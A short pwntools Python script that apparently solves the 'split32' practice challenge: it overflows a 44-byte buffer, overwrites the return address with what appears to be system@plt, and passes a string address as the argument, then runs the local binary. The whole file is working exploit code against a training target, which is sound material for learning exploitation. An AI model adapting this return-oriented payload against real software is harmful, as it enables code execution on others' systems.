from pwn import *

payload=b'A'*44
payload+=p32(0x080483e0)
payload+=b'\x00\x00\x00\x00'
payload+=p32(0x0804a030)


e =ELF("./split32")
p =e.process()
print(p.recvuntil(b'> '))
print(p.send(payload))

print(p.recvall())


